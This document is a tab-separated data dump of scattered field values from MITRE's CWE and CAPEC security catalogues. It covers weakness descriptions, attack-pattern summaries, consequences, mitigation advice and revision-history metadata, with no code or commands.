22328	23	An attacker can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the attacker illegitimate access to the target system, without possessing the requisite credentials. Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An attacker can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication.
11664	63	Gain Privileges or Assume Identity
22241	39	2009-05-27
25403	56	ChildOf
15838	35	MITRE
15942	59	Updated Related_Weaknesses
6346	62	updated Applicable_Platforms, References
7755	28	Eric Dalci
23929	51	2014-06-23
9066	63	Bypass Protection Mechanism
19882	85	401
19621	90	Language-Independent
12727	48	09
18095	76	2017-08-04
15004	35	MITRE
14248	101	CAPEC Content Team
11672	42	Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.
9679	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
13551	28	CWE Content Team
16327	104	649
17775	28	CWE Content Team
16823	28	CWE Content Team
13415	104	823
13770	104	271
19819	62	updated Description, Name
6091	48	08
22775	28	CWE Content Team
9879	28	CWE Content Team
9588	101	CAPEC Content Team
18714	39	2008-09-08
8825	31	1000
9805	39	2017-05-03
17614	56	ChildOf
23957	43	Simple
14271	62	updated Time_of_Introduction
17273	31	1003
16807	100	The MITRE Corporation
21485	62	updated Common_Consequences
15776	78	Low
18451	42	All objects that become part of session and application scope must implement the java.io.Serializable interface to ensure serializability of containing objects.
13981	35	MITRE
21108	74	3
10392	39	2008-07-01
11051	103	Primary
13878	28	CWE Content Team
13213	81	Other
17480	35	MITRE
9188	35	MITRE
16088	31	1000
24188	62	updated Potential_Mitigations
12338	42	Require languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness.
16153	104	515
24211	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15262	23	The program dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.
15891	28	CWE Content Team
20282	79	Authentication
24549	28	CWE Content Team
8606	39	2010-06-21
18575	51	2014-06-23
15099	28	CWE Content Team
16104	92	Experiment
7381	94	By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.
6053	28	CWE Content Team
21204	23	The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.
11677	56	ChildOf
24691	28	CWE Content Team
18883	101	CAPEC Content Team
20599	97	Content Spoofing
11334	35	MITRE
12292	39	2012-05-11
20057	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
20511	23	Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error.
23078	43	Simple
10977	39	2008-09-08
11044	23	The product uses a constant value, name, or reference, but this value can (or should) vary across different environments.
11166	28	CWE Content Team
10506	28	CWE Content Team
7263	28	CWE Content Team
6120	28	CWE Content Team
6422	72	An attacker may be able to modify critical properties of the associated resource to gain privileges, such as replacing a world-writable executable with a Trojan horse.
14403	100	The MITRE Corporation
14026	48	02
15282	31	1000
10610	62	updated Relationships, Other_Notes
17448	35	MITRE
13268	31	1000
22090	39	2019-06-20
13515	39	2019-01-03
15057	28	CWE Content Team
23022	62	updated Applicable_Platforms, Demonstrative_Examples
11135	92	Experiment
18968	51	2014-06-23
24331	91	Architecture and Design
10121	50	Design: Use strong session identifiers that are protected in transit and at rest.
6883	35	MITRE
11023	62	updated Relationships
13193	23	The product subtracts one value from another, such that the result is less than the minimum allowable integer value, which produces a value that is not equal to the correct result.
17562	97	Collect Data from Registries
14064	31	1000
20846	21	CWE Content Team
11333	28	CWE Content Team
21011	25	High
23971	62	updated Relationships
15288	31	699
14194	62	updated Demonstrative_Examples, References, Relationships
19446	39	2011-06-27
11998	89	Standard
7623	76	2018-07-31
9994	35	MITRE
24462	81	Non-Repudiation
13937	71	2012
18557	35	MITRE
21546	63	Unexpected State
17664	42	Verify return values are correct and do not supply sensitive information about the system.
22465	81	Integrity
14798	26	Implementation
8592	62	updated Applicable_Platforms, Relationships
10170	79	Integrity
8575	50	Utilize browsers that can warn users if URLs contain characters from different character sets.
15738	62	updated Relationships
10818	35	MITRE
11660	43	Simple
9098	35	MITRE
13164	85	536
25321	44	SOAR Partial
17982	35	MITRE
8016	62	updated Common_Consequences
10633	28	CWE Content Team
14868	28	CWE Content Team
21985	35	MITRE
21613	39	2012-10-30
9075	43	Simple
16180	39	2017-11-08
17720	35	MITRE
24831	91	Implementation
9616	42	Once found, these issues are easy to fix. Use code inspection tools and relevant compiler features to identify potential violations. Pay special attention to code that is not likely to be exercised heavily during QA.
15722	26	Operation
23706	62	updated Demonstrative_Examples, Name
14678	72	There is the potential for arbitrary code execution with privileges of the vulnerable program.
23543	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Choose languages with features such as exception handling that force the programmer to anticipate unusual conditions that may generate exceptions. Custom exceptions may need to be developed to handle unusual business-logic conditions. Be careful not to pass sensitive exceptions back to the user (CWE-209, CWE-248).
8046	26	Implementation
18999	66	Exceptions and Exception Handling (C# Programming Guide)
18732	31	1000
6341	81	Integrity
16280	62	updated Common_Consequences
23909	33	OWASP
9319	28	CWE Content Team
8339	62	updated Name
10392	28	Eric Dalci
23828	62	updated Potential_Mitigations
8790	69	Incomplete
8754	56	CanPrecede
23892	62	updated Relationships, Weakness_Ordinalities
8947	91	Testing
14976	42	When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.
25157	62	updated Common_Consequences
12587	28	CWE Content Team
9116	23	If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.
21532	35	MITRE
24244	28	CWE Content Team
14029	77	Manual Analysis
16362	62	updated Related_Attack_Patterns
21139	69	Draft
16342	100	The MITRE Corporation
20810	56	ChildOf
8528	100	The MITRE Corporation
12746	35	MITRE
21944	39	2010-06-21
25316	35	MITRE
13670	62	updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations
20272	103	Primary
11796	69	Draft
24063	28	CWE Content Team
11172	85	73
14370	39	2009-10-29
19257	62	updated Applicable_Platforms, Background_Details, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
21019	23	Adversaries install Wi-Fi equipment that acts as a legitimate Wi-Fi network access point. When a device connects to this access point, Wi-Fi data traffic is intercepted, captured, and analyzed. This also allows the adversary to act as a "man-in-the-middle" for all communications.
15174	39	2013-07-17
10305	100	The MITRE Corporation
19207	35	MITRE
9801	28	CWE Content Team
21587	35	MITRE
9072	79	Confidentiality
17085	56	ChildOf
24624	56	ChildOf
15783	31	1000
13640	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
19053	73	The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-132.
9472	101	CAPEC Content Team
21125	39	2017-11-08
5902	72	In some cases, injectable code controls authentication; this may lead to a remote vulnerability.
5779	43	Simple
19936	62	updated Relationships
13262	26	Architecture and Design
13615	56	ChildOf
13326	89	Detailed
13271	49	2009
10786	62	updated Relationships
12377	35	MITRE
17558	102	ChildOf
20796	69	Draft
11804	35	MITRE
15650	24	MITRE
15110	91	Architecture and Design
17383	40	The adversary requires knowledge of and access to network route.
24613	97	IP ID Sequencing Probe
15989	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, References, Taxonomy_Mappings
18524	28	CWE Content Team
11925	74	3
20977	62	updated Observed_Examples, Relationships
18777	76	2018-07-31
14214	85	230
17868	23	The product or code does not isolate system-dependent      functionality into separate standalone modules.
10587	56	ChildOf
10046	61	Draft
9416	42	Do not make explicit calls to finalize(). Use static analysis tools to spot such instances.
9417	23	The software utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource.
17881	62	updated Common_Consequences
7791	61	Draft
23053	63	Execute Unauthorized Code or Commands
6188	81	Other
17634	62	updated Applicable_Platforms, Background_Details, Demonstrative_Examples, Description, Name, References
9784	39	2019-06-20
6590	28	CWE Content Team
24153	39	2011-06-27
7721	28	CWE Content Team
25313	35	MITRE
18748	28	CWE Content Team
17676	88	Improper Neutralization of Trailing Special Elements
12814	35	MITRE
16523	35	MITRE
16191	35	MITRE
24373	30	R. Fielding
18168	47	Bypass Protection Mechanism
20070	104	53
21085	39	2013-02-21
19210	35	MITRE
12417	35	MITRE
16624	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
17964	63	DoS: Crash, Exit, or Restart
24304	62	updated Demonstrative_Examples, Potential_Mitigations
9509	103	Primary
18071	28	CWE Content Team
19559	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
18754	44	High
6062	51	2015-12-07
22256	40	The system does not implement an effective password throttling mechanism.
13550	40	Opportunity to intercept must exist beyond the point where SSL is terminated.
14162	62	updated Relationships, Taxonomy_Mappings
16262	62	updated Potential_Mitigations, Time_of_Introduction
20104	28	CWE Content Team
11127	78	Low
7593	31	699
22093	59	Updated Related_Weaknesses
15699	50	Implementation: Normalize, filter and sanitize all user supplied fields.
9688	62	updated Relationships
15043	35	MITRE
8320	62	updated Causal_Nature, Relationships
13799	39	2012-10-30
5941	28	CWE Content Team
16451	62	updated Potential_Mitigations
16926	73	The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.
18288	26	Implementation
15935	63	Unexpected State
13220	89	Standard
14124	88	Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
19924	31	699
16958	39	2015-12-07
7377	56	ChildOf
17971	35	MITRE
19750	78	Medium
13457	103	Primary
17868	57	Indirect
15595	45	Variant
8511	31	1000
24382	42	In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet.
17723	54	Low
15057	62	updated Applicable_Platforms, Demonstrative_Examples, Terminology_Notes
20548	46	This creates a race condition that allows an attacker to access the channel before the authorized user does.
19954	33	Chris Frohoff
15877	100	The MITRE Corporation
23844	39	2009-10-29
17395	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9879	39	2011-06-01
6476	92	Exploit
16092	26	Implementation
24056	35	MITRE
7889	39	2014-02-18
8682	39	2019-01-03
10793	31	699
24045	39	2019-01-03
19662	33	Steve Christey
12333	39	2014-07-30
19831	59	Updated Related_Attack_Patterns, Related_Weaknesses
24286	21	CWE Content Team
12042	62	updated Relationships, Taxonomy_Mappings
15896	28	CWE Content Team
23977	35	MITRE
18198	63	DoS: Crash, Exit, or Restart
15583	100	The MITRE Corporation
10046	40	The system uses one factor password based authentication.
14097	31	1000
24389	87	Web Server
11394	31	1000
14221	31	1000
13518	101	CAPEC Content Team
19963	91	Testing
25189	24	MITRE
17902	23	The software uses low-level functionality that is explicitly prohibited by the framework or specification under which the software is supposed to operate.
9557	101	CAPEC Content Team
6792	32	The Wikimedia Foundation, Inc
23957	90	C
13826	62	added/updated demonstrative examples
9653	62	updated Potential_Mitigations
13514	95	The attacker interacts with the target host and finds that session IDs are used to authenticate users.
15996	80	An attacker can use more sophisticated tool or script to scan a website and find a path filtering problem.
12390	53	The MITRE Corporation
8645	39	2009-03-10
10499	100	The MITRE Corporation
23586	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Type
17827	63	Bypass Protection Mechanism
15986	28	CWE Content Team
22020	62	updated Potential_Mitigations
8543	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
6255	62	updated Common_Consequences
20778	31	1000
6703	35	MITRE
15712	35	MITRE
15712	39	2019-06-20
24124	90	C
10282	28	CWE Content Team
21979	48	08
22756	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.                   Resource clean up errors might be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
12118	72	An attacker could escalate privileges.
8390	76	2017-08-04
7955	24	MITRE
16011	28	CWE Content Team
9670	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
14428	39	2015-12-07
9971	39	2008-07-01
23494	23	The software validates data before it has been filtered, which prevents the software from detecting data that becomes invalid after the filtering step.
21792	39	2015-12-07
11889	43	Simple
17266	66	Handbook of Applied Cryptography
19905	39	2011-03-29
21422	36	http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf
17177	80	To overwrite/modify targeted DNS cache
5806	26	Architecture and Design
18324	39	2012-05-11
19830	39	2014-06-23
22170	28	CWE Content Team
14591	90	C++
18590	39	2017-11-08
21104	100	The MITRE Corporation
22305	74	1
12729	102	ChildOf
10903	62	updated Functional_Areas, Other_Notes
25410	35	MITRE
6707	101	CAPEC Content Team
13483	28	CWE Content Team
15113	100	The MITRE Corporation
13240	50	Leverage anti-virus products to detect stop operations with known virus.
13813	23	The software calls a function, procedure, or routine, but the caller specifies an argument that contains the wrong value, which may lead to resultant weaknesses.
21540	54	High
6437	100	The MITRE Corporation
24657	53	The MITRE Corporation
10722	56	PeerOf
19267	28	Eric Dalci
24256	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.
20955	31	1003
13930	53	The MITRE Corporation
24699	31	1000
7614	40	User-controllable input not properly sanitized
25347	71	2009
14701	39	2008-11-24
24729	77	Dynamic Analysis with Manual Results Interpretation
20750	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, Relationships, Time_of_Introduction
13205	35	MITRE
13770	43	Simple
17158	53	The MITRE Corporation
17035	28	CWE Content Team
15219	103	Primary
20174	79	Access Control
15745	78	High
5865	50	Implementation: use SSL when loading external data
6980	28	CWE Content Team
20530	62	updated Demonstrative_Examples
14995	35	MITRE
15531	69	Draft
7837	62	updated Taxonomy_Mappings
23565	39	2013-07-17
14611	40	The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.
11471	39	2019-06-20
11259	63	Unexpected State
17436	62	updated Relationships, Taxonomy_Mappings
19035	43	Simple
6149	35	MITRE
8913	91	Architecture and Design
10609	39	2017-05-03
13907	84	25
18317	28	CWE Content Team
19513	26	Implementation
6386	62	updated Common_Consequences
23450	35	MITRE
8620	51	2015-11-09
8504	28	CWE Content Team
9114	42	A non-SQL style database which is not subject to this flaw may be chosen.
19288	23	The software has a loop body or loop condition that contains a control element that directly or      indirectly consumes platform resources, e.g. messaging, sessions, locks, or file      descriptors.
23696	91	Implementation
20169	26	Implementation
20266	39	2017-11-08
18419	62	updated Relationships
12527	28	CWE Content Team
23717	61	Draft
6686	28	CWE Content Team
15979	62	updated Relationships, Taxonomy_Mappings
11255	28	CWE Content Team
22612	28	CWE Content Team
7263	62	updated Relationships, Taxonomy_Mappings
14634	39	2012-05-11
11209	74	1
7545	35	MITRE
10302	59	Updated Attack_Phases
6001	85	134
19626	56	ChildOf
5819	28	CWE Content Team
7037	103	Primary
21224	28	CWE Content Team
18349	35	MITRE
13064	28	CWE Content Team
21181	85	78
18319	32	Adobe Systems Incorporated
11547	31	1000
20467	28	CWE Content Team
8891	43	Simple
9346	54	High
21902	28	CWE Content Team
23994	56	CanPrecede
17208	43	Simple
6757	62	updated Description, Relationships, Observed_Example, Other_Notes
23809	39	2009-12-28
23789	28	CWE Content Team
24963	91	Implementation
10668	26	Implementation
24653	80	Hardware creation and manufacture of replacement components.
9682	104	773
18522	40	The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)
25108	104	577
6445	79	Integrity
15653	85	35
14091	63	Hide Activities
16527	22	06
22474	39	2012-05-11
22066	28	CWE Content Team
11049	76	2019-04-04
19691	76	2017-08-04
12977	25	High
22129	28	CWE Content Team
22996	35	MITRE
20759	100	The MITRE Corporation
11759	44	Opportunistic
8774	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/354.html
12057	102	ChildOf
14162	39	2014-07-30
9086	39	2008-09-08
19981	102	ChildOf
23233	39	2013-07-17
7415	91	Operation
6837	28	CWE Content Team
15009	28	CWE Content Team
10662	59	Updated Related_Weaknesses
20389	26	Implementation
22748	26	Architecture and Design
8573	31	1000
12981	28	CWE Content Team
23734	62	updated Relationships
16788	59	Updated Related_Attack_Patterns
10092	42	Reject all alternate path encodings that are not in the expected canonical form.
9065	31	699
5588	89	Detailed
6137	83	Issue 56
9708	62	updated Relationships, Taxonomy_Mappings
6477	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Potential_Mitigations, Relationships
20154	62	updated Common_Consequences
25222	90	Language-Independent
11507	39	2012-05-11
10822	63	Read Application Data
10872	35	MITRE
9587	35	MITRE
6109	28	CWE Content Team
6874	79	Availability
23853	62	updated Potential_Mitigations
22717	39	2019-01-03
17303	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
20868	28	CWE Content Team
10494	63	Gain Privileges or Assume Identity
14356	74	2
16009	35	MITRE
24532	92	Exploit
12056	63	Read Application Data
9921	39	2008-09-08
23152	39	2010-04-05
21159	103	Primary
13317	63	Bypass Protection Mechanism
14349	100	The MITRE Corporation
14185	62	updated Relationships
8485	39	2017-11-08
16052	39	2011-09-13
23806	39	2009-07-27
7658	26	Implementation
19464	89	Standard
20617	39	2018-03-27
6183	39	2017-11-08
24186	94	Run Arbitrary Code
20748	49	2008
15856	43	Simple
23793	57	Primary
11234	39	2014-06-23
14888	46	When an exception is thrown and not caught, the process has given up an opportunity to decide if a given failure or event is worth a change in execution.
19116	76	2015-11-09
15237	72	Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
21061	73	Use a browser to manually explore the website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery.
21953	62	updated Description
16806	26	Implementation
19231	28	CWE Content Team
6366	35	MITRE
19610	78	Low
9078	63	Varies by Context
18471	62	updated Relationships
14878	66	UDP-based Amplification Attacks
8493	40	The adversary must have internal, logical access to the target network and system.
25157	35	MITRE
24175	39	2010-02-16
20216	62	updated Demonstrative_Examples
10188	76	2018-07-31
11986	28	CWE Content Team
17841	90	C
12516	62	added/updated demonstrative examples
9115	66	How to Break Software Security
8548	44	High
9269	28	CWE Content Team
21989	35	MITRE
24375	23	Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.
9473	26	Implementation
20834	56	ChildOf
17455	62	updated Common_Consequences, Other_Notes
11648	45	Variant
6326	77	Architecture or Design Review
9703	28	CWE Content Team
16077	35	MITRE
25145	103	Primary
21248	28	CWE Content Team
13628	81	Integrity
10121	50	Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.
21315	35	MITRE
20931	101	CAPEC Content Team
25211	39	2010-09-27
16032	35	MITRE
17293	85	389
6066	47	Bypass Protection Mechanism
14383	26	Architecture and Design
21983	26	Architecture and Design
18057	62	updated Potential_Mitigations
18193	42	For front-end to back-end connections: Three solutions are possible, although none are complete.                                         The first suggestion involves the use of generated passwords which are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.                      Next, the passwords used should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.                      Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay style attacks.
25189	96	2010-09-22
23012	62	updated Relationships
19160	39	2011-06-27
9249	79	Integrity
21968	31	1000
10362	39	2014-07-30
7539	28	CWE Content Team
10320	35	MITRE
14053	35	MITRE
13407	55	CAPEC Content Team
21066	35	MITRE
16482	28	CWE Content Team
20712	35	MITRE
20660	39	2008-09-08
18674	45	Variant
18181	63	Hide Activities
12345	25	Medium
13654	35	MITRE
9551	63	Gain Privileges or Assume Identity
6816	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Detection_Factors, Name, Other_Notes, Potential_Mitigations, Weakness_Ordinalities
9832	62	updated Potential_Mitigations
12383	56	ChildOf
25144	55	CAPEC Content Team
15771	103	Primary
10981	72	An attacker could utilize an ignored error condition to place the system in an unexpected state that could lead to the execution of unintended logic and could cause other unintended behavior.
22703	62	updated Name
15637	91	Implementation
16056	28	Eric Dalci
9972	39	2011-06-01
18576	39	2014-06-23
12723	39	2008-08-15
23708	45	Base
8910	62	updated Description
12804	21	PLOVER
6611	28	CWE Content Team
10677	35	MITRE
23316	33	Steven Devijver
5720	62	updated Relationships, Taxonomy_Mappings
6490	42	When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.
13224	63	Unexpected State
14645	74	2
15565	62	updated Common_Consequences
17845	83	IEEE Std 1003.1, 2004 Edition
18948	28	CWE Content Team
24275	62	updated Description, Name, Relationships
16386	63	Execute Unauthorized Code or Commands
17198	63	Modify Application Data
16227	43	Simple
13497	40	The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern.
23913	31	699
14503	81	Integrity
10462	35	MITRE
20817	88	Use of Implicit Intent for Sensitive Communication
19564	28	CWE Content Team
12112	56	ChildOf
14409	35	MITRE
17870	56	ChildOf
21471	45	Variant
13381	39	2017-11-08
22773	31	699
12220	74	4
21951	39	2008-07-01
8813	95	If required, authenticate to the distribution channel
9542	28	Eric Dalci
19706	28	CWE Content Team
10486	39	2008-09-08
9626	97	DLL Side-Loading
13810	28	CWE Content Team
15687	31	699
22319	39	2012-05-11
22294	62	updated Demonstrative_Examples, References
8880	77	Automated Static Analysis - Binary or Bytecode
12688	62	updated Related_Attack_Patterns
9934	78	High
24659	62	updated Common_Consequences, Description, Relationships, Other_Notes, Relevant_Properties, Taxonomy_Mappings
20585	79	Access Control
7266	104	1004
20329	39	2017-11-08
10322	81	Access Control
7324	31	1000
22188	79	Authorization
11911	53	The MITRE Corporation
21641	35	MITRE
9983	62	updated Demonstrative_Examples
15534	62	updated Time_of_Introduction
14010	101	CAPEC Content Team
14474	31	1000
7742	42	Resolve all input to absolute or canonical representations before processing.
11586	28	CWE Content Team
5876	31	1000
8921	39	2014-07-30
14638	76	2019-09-30
15618	80	More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing his valid session ID.
18830	51	2014-06-23
16923	62	updated Background_Details
20993	28	CWE Content Team
11493	35	MITRE
10030	35	Veracode
24862	62	updated White_Box_Definitions
10178	56	ChildOf
17865	26	Architecture and Design
5997	39	2011-03-29
19299	40	Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data
11208	31	699
15194	39	2012-10-30
13624	46	A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold, or when a program attempts to put data in a memory area outside of the boundaries of a buffer. The simplest type of error, and the most common cause of buffer overflows, is the "classic" case in which the program copies the buffer without restricting how much is copied. Other variants exist, but the existence of a classic overflow strongly suggests that the programmer is not considering even the most basic of security protections.
21739	35	MITRE
7674	39	2017-01-19
10126	35	MITRE
11788	28	CWE Content Team
17488	92	Exploit
13447	85	141
17116	39	2015-12-07
24165	28	CWE Content Team
6393	35	MITRE
8340	85	640
24940	90	C++
7244	77	Automated Static Analysis - Binary or Bytecode
13263	35	MITRE
22949	39	2011-06-27
10453	62	updated Relationships
22288	39	2011-06-01
16751	63	Unexpected State
18397	54	Low
22678	39	2017-11-08
16134	28	CWE Content Team
24424	63	Bypass Protection Mechanism
17875	39	2012-05-11
10129	62	updated Relationships, Taxonomy_Mappings
6104	39	2009-12-28
13926	39	2010-12-13
16205	35	MITRE
23080	42	Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
9780	88	Struts: Incomplete validate() Method Definition
20065	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21627	62	updated Relationships, Other_Notes, Taxonomy_Mappings
22205	28	CWE Content Team
21445	62	updated Relationships, Taxonomy_Mappings
22043	43	Simple
18797	91	Distribution
14459	35	MITRE
22159	35	MITRE
24408	62	updated Relationships
8260	53	The MITRE Corporation
24843	28	CWE Content Team
21357	28	CWE Content Team
7098	63	Bypass Protection Mechanism
13096	104	180
21417	21	CWE Content Team
8985	74	2
22422	61	Draft
22616	39	2011-09-13
12762	43	Simple
11298	45	Variant
11334	28	CWE Content Team
8232	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Observed_Examples, Potential_Mitigations
9548	39	2009-03-10
18769	28	CWE Content Team
23492	39	2008-09-08
18940	62	updated Description
12433	28	CWE Content Team
17356	104	83
8463	28	CWE Content Team
11770	91	Architecture and Design
9092	62	updated Relationships, Other_Notes, Taxonomy_Mappings
5917	62	updated Relationships
6799	28	CWE Content Team
21733	47	Modify Data
9199	21	PLOVER
11370	35	MITRE
15514	39	2018-03-27
8869	59	Updated Related_Attack_Patterns
10750	62	updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings
6846	39	2008-07-01
24892	28	CWE Content Team
6160	35	MITRE
8676	48	08
25277	100	The MITRE Corporation
20172	62	updated Potential_Mitigations
25193	39	2011-06-01
9329	60	11
12248	72	The primary result of reflection attacks is successful authentication with a target machine -- as an impersonated user.
7550	59	Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required
15330	39	2008-08-01
16958	62	updated Relationships
9784	62	updated Relationships
16673	103	Primary
8245	39	2017-11-08
11313	62	updated Relationships
9126	56	ChildOf
13082	53	The MITRE Corporation
5782	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
10968	28	CWE Content Team
15057	39	2014-02-18
23793	90	Python
10346	28	CWE Content Team
16057	50	Ensure that the algorithms are used properly. That means:                                                         1. Not rolling out your own crypto; Use proven algorithms and implementations.                      2. Choosing initialization vectors with sufficiently random numbers                      3. Generating key material using good sources of randomness and avoiding known weak keys                      4. Using proven protocols and their implementations.                      5. Picking the most appropriate cryptographic algorithm for your usage context and data
17077	23	[PLANNED FOR DEPRECATION. SEE MAINTENANCE NOTES.] Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed.
18266	28	CWE Content Team
20134	35	MITRE
21931	62	added/updated white box definitions
6392	39	2019-06-20
16804	28	Eric Dalci
6217	49	2011
13650	62	updated Description, Name
19997	42	Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.
6961	103	Primary
9840	95	Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.
14074	76	2018-07-31
10463	85	623
15423	28	CWE Content Team
15321	35	MITRE
8406	89	Detailed
10389	42	Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing.
15339	42	When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.
23628	57	Resultant
19345	28	CWE Content Team
15951	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
9810	72	An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data.
9291	39	2010-04-05
17928	88	J2EE Bad Practices: Non-serializable Object Stored in Session
18186	35	MITRE
11645	50	Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.
21361	27	Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.
5717	69	Incomplete
16412	42	Only free pointers that you have called malloc on previously. This is the recommended solution. Keep track of which pointers point at the beginning of valid chunks and free them only once.
22898	62	updated Description, Name
24987	25	Low
22378	49	2003
7059	62	updated Relationships, Taxonomy_Mappings
25134	35	MITRE
6414	28	CWE Content Team
7553	39	2010-09-27
9512	72	An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.
8974	35	MITRE
23308	62	updated Related_Attack_Patterns, Relationships
20381	61	Draft
13396	35	MITRE
6410	28	CWE Content Team
13531	62	updated Background_Details, Common_Consequences, Relationships, Taxonomy_Mappings
20999	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
19177	69	Incomplete
6372	92	Experiment
24866	30	Ami Luttwak
24645	62	updated Alternate_Terms
19435	39	2012-05-11
10078	62	updated Name, Observed_Examples, Potential_Mitigations, References, Relationships
8121	40	The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.
14330	79	Availability
24364	63	Gain Privileges or Assume Identity
19306	80	The adversary needs to be able to infect the victim system in a manner that gives him remote access.
7818	51	2014-06-23
5617	62	updated Relationships, Taxonomy_Mappings
10926	39	2012-05-11
20543	59	Updated References
6050	91	Operation
16940	35	MITRE
